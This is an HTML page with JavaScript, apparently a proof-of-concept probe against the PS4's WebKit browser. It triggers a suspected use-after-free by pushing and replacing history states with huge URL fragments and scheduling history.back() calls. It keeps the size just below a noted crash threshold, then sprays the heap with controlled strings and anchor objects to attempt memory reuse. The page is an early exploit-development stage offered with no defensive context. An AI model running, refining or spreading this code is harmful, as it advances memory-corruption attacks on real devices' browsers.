<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – UAF Heap Reuse Probe</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
#log { white-space: pre-wrap; }
button { padding:10px; margin:5px; font-size:16px; }
</style>
</head>

<body>
<h2>PS4 WebKit – Fragment UAF Heap Reuse Probe</h2>

<button onclick="run()">RUN UAF PROBE</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const FRAG_TARGET = 670000; // abaixo do crash (~680k)
const ITER = 48;

async function run(){
    logEl.textContent = "";
    log("=== START UAF PROBE ===");

    let size = 977;

    for(let i=0;i<ITER;i++){
        const frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(`[ITER ${i}] history.back scheduled`);
        }

        size += 14461;
        await sleep(5);
    }

    log(">>> UAF WINDOW REACHED (no crash) <<<");
    await sleep(100);

    // ------------------------------------------------
    // HEAP REUSE ATTEMPT
    // ------------------------------------------------
    log("[REUSE] Allocating controlled strings");
    let pool = [];
    for(let i=0;i<2000;i++){
        pool.push("R".repeat(1024));
    }

    log("[REUSE] Allocating URL objects");
    let urls = [];
    for(let i=0;i<1000;i++){
        let a = document.createElement("a");
        a.href = "https://example.com/#" + "Z".repeat(1024);
        urls.push(a);
    }

    log("[REUSE] Accessing history after reuse pressure");
    try {
        history.length;
        log("history.length accessed");
    } catch(e){
        log("Exception reading history.length");
    }

    log("=== END PROBE ===");
}
</script>
</body>
</html>

